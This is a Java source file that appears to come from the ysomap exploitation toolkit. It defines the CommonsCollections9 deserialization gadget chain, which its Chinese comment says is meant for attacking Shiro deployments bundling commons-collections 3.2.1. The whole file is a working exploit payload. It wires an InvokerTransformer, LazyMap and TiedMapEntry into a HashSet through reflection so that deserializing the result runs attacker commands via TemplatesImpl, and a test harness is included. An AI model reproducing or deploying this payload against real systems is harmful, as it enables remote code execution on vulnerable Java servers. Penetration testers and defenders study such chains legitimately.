package ysomap.gadget.payload.collections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.runner.PayloadTester;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.TemplatesImplBullet;
import ysomap.gadget.payload.Payload;
import ysomap.serializer.Serializer;
import ysomap.serializer.SerializerFactory;
import ysomap.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 该payload主要为了攻击shiro环境自带的3.2.1
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({ Authors.WH1T3P1G })
public class CommonsCollections9 extends Payload<HashSet> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("");
    }

    @Override
    public HashSet pack(Object obj) throws Exception {
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, obj);

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        Reflections.setAccessible(f);
        HashMap innimpl = null;
        innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        Reflections.setAccessible(f2);
        Object[] array = new Object[0];
        array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return map;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) {
        return new TemplatesImplBullet(command);
    }

    public static void main(String[] args) {
        ObjectGadget bullet = new TemplatesImplBullet(null);
        new PayloadTester(CommonsCollections9.class)
                .setBullet(bullet)
                .run();
    }
}
